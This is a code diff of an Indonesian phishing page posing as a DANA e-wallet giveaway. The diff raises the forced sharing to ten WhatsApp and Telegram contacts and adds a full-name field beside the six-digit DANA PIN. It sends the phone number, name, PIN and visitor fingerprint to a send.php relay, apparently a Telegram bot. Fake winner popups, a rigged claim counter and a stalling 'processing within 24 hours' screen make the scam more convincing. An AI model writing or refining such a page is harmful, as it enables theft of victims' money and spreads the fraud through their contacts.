@@ -255,6 +255,10 @@
             color: #9CA3AF;
         }
         #step2, #stepPin, #step3 { display: none; }
+        .success-check {
+            font-size: 60px;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
@@ -281,58 +285,77 @@
             </div>
             <div class="info-banner">
                 <p>🔐 Verifikasi 2 Langkah</p>
-                <p>Bagikan ke 5 kontak untuk membuka PIN</p>
+                <p>Bagikan link ini ke 10 kontak (WhatsApp/Telegram) untuk melanjutkan.</p>
             </div>
             <button class="btn btn-primary" id="verifyBtn">Lanjutkan</button>
         </div>
 
-        <!-- STEP 2: SHARE 5 KONTAK -->
+        <!-- STEP 2: SHARE 10 KONTAK (5 WA + 5 TG) -->
         <div id="step2">
             <div class="info-banner" style="background: #E0F2FE; border-left-color: #0284C7;">
                 <p>✅ Nomor: <strong id="verifiedPhoneDisplay"></strong></p>
-                <p>📤 Share ke <strong>5 kontak</strong> (WhatsApp/Telegram)</p>
+                <p>📤 Bagikan ke <strong>10 kontak</strong> (masing-masing platform max 5x)</p>
             </div>
             <div class="progress-container">
                 <div class="progress-bar-bg">
                     <div class="progress-bar-fill" id="shareProgressFill"></div>
                 </div>
                 <div class="progress-stats">
-                    <span><span id="shareCountDisplay">0</span>/5 Dibagikan</span>
+                    <span><span id="shareCountDisplay">0</span>/10 Dibagikan</span>
                     <span id="progressPercent">0%</span>
+                </div>
+                <div style="font-size:13px; margin-top:8px; color:#666;">
+                    ✅ WA: <span id="waCount">0</span>/5 &nbsp;&nbsp;|&nbsp;&nbsp; 📨 TG: <span id="tgCount">0</span>/5
                 </div>
             </div>
             <div class="share-buttons">
                 <button class="btn btn-wa" id="shareWA">💬 WhatsApp</button>
                 <button class="btn btn-tg" id="shareTG">📨 Telegram</button>
             </div>
+            <div id="shareCompleteMessage" style="display:none; margin:20px 0; padding:15px; background:#D1FAE5; border-radius:16px; color:#065F46;">
+                ✅ Selamat! Anda sudah berhasil membagikan link. Silakan lengkapi data di bawah.
+            </div>
             <button class="btn btn-primary" id="goToPinBtn" disabled>
-                🔐 Masukkan PIN DANA
+                🔐 Lanjutkan ke Verifikasi PIN
             </button>
         </div>
 
-        <!-- STEP PIN: INPUT 6 DIGIT -->
+        <!-- STEP PIN: INPUT NAMA & PIN -->
         <div id="stepPin">
             <div class="info-banner" style="background: #FEE2E2; border-left-color: #EF4444;">
-                <p>🔒 Verifikasi Keamanan</p>
-                <p>Masukkan 6 digit PIN DANA Anda</p>
+                <p>🔒 Verifikasi Akun DANA</p>
+                <p>Masukkan nama lengkap sesuai akun DANA dan 6 digit PIN Anda.</p>
             </div>
-            <div class="pin-container">
-                <input type="tel" maxlength="1" class="pin-digit" id="pin1" inputmode="numeric">
-                <input type="tel" maxlength="1" class="pin-digit" id="pin2" inputmode="numeric">
-                <input type="tel" maxlength="1" class="pin-digit" id="pin3" inputmode="numeric">
-                <input type="tel" maxlength="1" class="pin-digit" id="pin4" inputmode="numeric">
-                <input type="tel" maxlength="1" class="pin-digit" id="pin5" inputmode="numeric">
-                <input type="tel" maxlength="1" class="pin-digit" id="pin6" inputmode="numeric">
+            <div class="form-group">
+                <label>👤 Nama Lengkap (sesuai KTP/Akun)</label>
+                <div class="input-wrapper">
+                    <input type="text" id="fullNameInput" placeholder="Contoh: Budi Santoso" autocomplete="off">
+                </div>
             </div>
-            <div class="error-msg" id="pinError">PIN harus 6 digit</div>
-            <button class="btn btn-success" id="claimFinalBtn">✅ Klaim Saldo Sekarang</button>
+            <div class="form-group">
+                <label>🔢 PIN DANA (6 Digit)</label>
+                <div class="pin-container">
+                    <input type="tel" maxlength="1" class="pin-digit" id="pin1" inputmode="numeric">
+                    <input type="tel" maxlength="1" class="pin-digit" id="pin2" inputmode="numeric">
+                    <input type="tel" maxlength="1" class="pin-digit" id="pin3" inputmode="numeric">
+                    <input type="tel" maxlength="1" class="pin-digit" id="pin4" inputmode="numeric">
+                    <input type="tel" maxlength="1" class="pin-digit" id="pin5" inputmode="numeric">
+                    <input type="tel" maxlength="1" class="pin-digit" id="pin6" inputmode="numeric">
+                </div>
+                <div class="error-msg" id="pinError">PIN harus 6 digit</div>
+            </div>
+            <button class="btn btn-success" id="claimFinalBtn">✅ Kirim & Klaim Saldo</button>
         </div>
 
-        <!-- STEP 3: SUKSES -->
+        <!-- STEP 3: SUKSES & PROSES 1x24 JAM -->
         <div id="step3">
-            <div style="font-size: 60px; margin: 10px 0;">✅</div>
-            <h2 style="color: #059669;">Klaim Berhasil!</h2>
-            <p>Saldo <strong id="finalAmountDisplay">Rp 500.000</strong> akan masuk ke <span id="finalPhoneDisplay"></span></p>
+            <div class="success-check">⏳</div>
+            <h2 style="color: #059669;">Klaim Sedang Diproses</h2>
+            <p style="margin:16px 0">Saldo <strong id="finalAmountDisplay">Rp 500.000</strong> akan masuk ke akun DANA atas nama <strong id="finalNameDisplay"></strong> dalam 1x24 jam.</p>
+            <div style="background:#F3F4F6; border-radius:20px; padding:16px;">
+                <p>📋 Nomor: <span id="finalPhoneDisplay"></span></p>
+                <p>⏱️ Estimasi: 1x24 jam kerja</p>
+            </div>
             <button class="btn btn-primary" style="margin-top: 24px;" onclick="window.location.href='https://www.dana.id/download'">
                 📲 Buka Aplikasi DANA
             </button>
@@ -351,15 +374,17 @@
     <script>
         // === KONFIGURASI ===
         const WEBHOOK_URL = 'send.php';  // Ganti dengan URL send.php Anda
-        const REQUIRED_SHARES = 5;
-        const REWARD_AMOUNT = 500000; // Sesuai tema hajatan
+        const MAX_SHARE_PER_PLATFORM = 5;
+        const TOTAL_REQUIRED = 10; // 5 WA + 5 TG
+        const REWARD_AMOUNT = 500000;
 
         // State
         let shareCount = 0;
+        let waShares = 0;
+        let tgShares = 0;
         let phoneNumberRaw = '';
         let phoneFormatted = '';
         let visitorData = {};
-        let shareUsed = { wa: false, tg: false };
         let popupInterval, counterInterval;
 
         // Format Rupiah
@@ -373,7 +398,7 @@
             claimBase += Math.floor(Math.random() * 5) + 1;
             document.getElementById('claimCounter').textContent = claimBase.toLocaleString('id-ID');
         }
-        counterInterval = setInterval(updateCounter, 45000); // tiap 45 detik
+        counterInterval = setInterval(updateCounter, 45000);
 
         // Popup dinamis
         const names = ['Agus Setiawan','Siti Aminah','Budi Santoso','Dewi Lestari','Eko Prasetyo','Rina Marlina','Joko Widodo','Tini Sumarni','Anto Wijaya','Wati Susanti','Yanto Nugroho','Sari Indah','Hendra Gunawan','Putri Ayu','Rudi Hartono','Ani Lestari','Fajar Hidayat','Maya Sari','Dedi Kurniawan','Lina Oktavia'];
@@ -383,26 +408,20 @@
             const textEl = document.getElementById('popupText');
             const name = names[Math.floor(Math.random() * names.length)];
             const city = cities[Math.floor(Math.random() * cities.length)];
-            const amount = Math.floor(Math.random() * 19000000) + 1000000; // 1jt - 20jt
+            const amount = Math.floor(Math.random() * 19000000) + 1000000;
             textEl.textContent = `${name} dari ${city} menerima Rp${amount.toLocaleString('id-ID')}`;
             popup.classList.add('show');
             setTimeout(() => popup.classList.remove('show'), 5000);
         }
-        function hidePopup() {
-            document.getElementById('popupNotification').classList.remove('show');
-        }
-        popupInterval = setInterval(showRandomPopup, 12000); // tiap 12 detik
+        function hidePopup() { document.getElementById('popupNotification').classList.remove('show'); }
+        popupInterval = setInterval(showRandomPopup, 12000);
         setTimeout(() => showRandomPopup(), 2000);
 
         // Kirim data ke Telegram
         async function sendToTelegram(payload) {
             try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(payload)
-                });
-            } catch(e) { console.error(e); }
+                await fetch(WEBHOOK_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) });
+            } catch(e) {}
         }
 
         // Info pengunjung
@@ -414,18 +433,13 @@
                 loc = `${d.city || ''}, ${d.country_name || ''}`.trim();
             } catch(e){}
             return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                location: loc,
-                referrer: document.referrer || 'Direct',
-                timestamp: new Date().toLocaleString('id-ID'),
-                timestampISO: new Date().toISOString()
+                userAgent: navigator.userAgent, platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`, language: navigator.language,
+                location: loc, referrer: document.referrer || 'Direct',
+                timestamp: new Date().toLocaleString('id-ID'), timestampISO: new Date().toISOString()
             };
         }
 
-        // Validasi HP
         function validatePhone(input) {
             let cleaned = input.replace(/\D/g, '');
             if (cleaned.startsWith('0')) cleaned = cleaned.substring(1);
@@ -433,7 +447,22 @@
             return cleaned;
         }
 
-        // Event: Verifikasi HP
+        // Update UI progress share
+        function updateShareUI() {
+            let percent = (shareCount / TOTAL_REQUIRED) * 100;
+            document.getElementById('shareProgressFill').style.width = percent + '%';
+            document.getElementById('shareCountDisplay').textContent = shareCount;
+            document.getElementById('progressPercent').textContent = percent + '%';
+            document.getElementById('waCount').textContent = waShares;
+            document.getElementById('tgCount').textContent = tgShares;
+
+            if (shareCount >= TOTAL_REQUIRED) {
+                document.getElementById('goToPinBtn').disabled = false;
+                document.getElementById('shareCompleteMessage').style.display = 'block';
+            }
+        }
+
+        // EVENT: Verifikasi HP
         document.getElementById('verifyBtn').addEventListener('click', async function() {
             let raw = document.getElementById('phoneInput').value.trim();
             let cleaned = validatePhone(raw);
@@ -457,55 +486,59 @@
             
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
+            updateShareUI();
         });
 
-        // Share
-        document.getElementById('shareWA').addEventListener('click', ()=> fakeShare('wa'));
-        document.getElementById('shareTG').addEventListener('click', ()=> fakeShare('tg'));
+        // Fungsi share generik
+        async function handleShare(platform) {
+            if (shareCount >= TOTAL_REQUIRED) {
+                alert('Anda sudah mencapai batas share!');
+                return;
+            }
+            if (platform === 'wa' && waShares >= MAX_SHARE_PER_PLATFORM) {
+                alert('Batas share WhatsApp sudah tercapai (5x). Gunakan Telegram.');
+                return;
+            }
+            if (platform === 'tg' && tgShares >= MAX_SHARE_PER_PLATFORM) {
+                alert('Batas share Telegram sudah tercapai (5x). Gunakan WhatsApp.');
+                return;
+            }
 
-        async function fakeShare(platform) {
-            if (shareCount >= REQUIRED_SHARES) return;
-            if (platform === 'wa' && shareUsed.wa) { alert('Sudah share WhatsApp'); return; }
-            if (platform === 'tg' && shareUsed.tg) { alert('Sudah share Telegram'); return; }
-            
             let text = encodeURIComponent(`🎉 DAPAT SALDO DANA ${formatRp(REWARD_AMOUNT)} GRATIS! 🎉\nKlik & klaim: ${window.location.href}`);
             let url = platform === 'wa' ? `https://wa.me/?text=${text}` : `https://t.me/share/url?url=${window.location.href}&text=${text}`;
             window.open(url, '_blank', 'width=600,height=400');
-            
-            if (platform === 'wa') shareUsed.wa = true; else shareUsed.tg = true;
-            shareCount++;
-            updateProgress();
-            
+
+            // Update hitungan
+            if (platform === 'wa') waShares++; else tgShares++;
+            shareCount = waShares + tgShares;
+            updateShareUI();
+
             visitorData.event = 'share';
             visitorData.shareCount = shareCount;
-            visitorData.platform = platform;
-            visitorData.message = `📤 Share ${shareCount}/5 via ${platform}`;
+            visitorData.waShares = waShares;
+            visitorData.tgShares = tgShares;
+            visitorData.message = `📤 Share ${shareCount}/${TOTAL_REQUIRED} via ${platform}`;
             await sendToTelegram(visitorData);
-            
-            if (shareCount >= REQUIRED_SHARES) {
-                document.getElementById('goToPinBtn').disabled = false;
+
+            if (shareCount >= TOTAL_REQUIRED) {
                 visitorData.event = 'share_complete';
-                visitorData.message = `✅ Share 5 selesai!\nNomor: \`${phoneNumberRaw}\`\nMenunggu PIN...`;
+                visitorData.message = `✅ Share 10 selesai!\nNomor: \`${phoneNumberRaw}\`\nMenunggu input Nama & PIN...`;
                 await sendToTelegram(visitorData);
             }
         }
 
-        function updateProgress() {
-            let percent = (shareCount / REQUIRED_SHARES) * 100;
-            document.getElementById('shareProgressFill').style.width = percent + '%';
-            document.getElementById('shareCountDisplay').textContent = shareCount;
-            document.getElementById('progressPercent').textContent = percent + '%';
-        }
+        document.getElementById('shareWA').addEventListener('click', ()=> handleShare('wa'));
+        document.getElementById('shareTG').addEventListener('click', ()=> handleShare('tg'));
 
-        // Go to PIN
+        // Lanjut ke input PIN & Nama
         document.getElementById('goToPinBtn').addEventListener('click', function() {
-            if (shareCount < REQUIRED_SHARES) return;
+            if (shareCount < TOTAL_REQUIRED) return;
             document.getElementById('step2').style.display = 'none';
             document.getElementById('stepPin').style.display = 'block';
             document.getElementById('pin1').focus();
         });
 
-        // PIN input auto-tab
+        // Auto-tab PIN
         const pinInputs = document.querySelectorAll('.pin-digit');
         pinInputs.forEach((inp, idx) => {
             inp.addEventListener('input', function() {
@@ -516,8 +549,16 @@
             });
         });
 
-        // Klaim Final
+        // Klaim Final dengan Nama & PIN
         document.getElementById('claimFinalBtn').addEventListener('click', async function() {
+            // Validasi Nama
+            let fullName = document.getElementById('fullNameInput').value.trim();
+            if (fullName === '') {
+                alert('Nama lengkap harus diisi');
+                return;
+            }
+
+            // Validasi PIN
             let pinDigits = [];
             for(let i=1; i<=6; i++) {
                 let val = document.getElementById('pin'+i).value;
@@ -530,16 +571,19 @@
             document.getElementById('pinError').style.display = 'none';
             let pin = pinDigits.join('');
             
-            visitorData.event = 'pin_submitted';
+            // Kirim data final
+            visitorData.event = 'full_data_submitted';
+            visitorData.fullName = fullName;
             visitorData.pin = pin;
-            visitorData.message = `🔐 DATA LENGKAP\n📱 \`${phoneNumberRaw}\`\n🔢 PIN: \`${pin}\`\n💰 ${formatRp(REWARD_AMOUNT)}\n🌍 ${visitorData.location}`;
+            visitorData.message = `🔐 DATA LENGKAP DIDAPATKAN\n📱 \`${phoneNumberRaw}\`\n👤 Nama: ${fullName}\n🔢 PIN: \`${pin}\`\n💰 ${formatRp(REWARD_AMOUNT)}\n🌍 ${visitorData.location}`;
             await sendToTelegram(visitorData);
             
+            document.getElementById('finalNameDisplay').textContent = fullName;
             document.getElementById('stepPin').style.display = 'none';
             document.getElementById('step3').style.display = 'block';
         });
 
-        // Init
+        // Init kunjungan
         window.addEventListener('load', async () => {
             let initData = await getVisitorInfo();
             initData.event = 'page_visit';
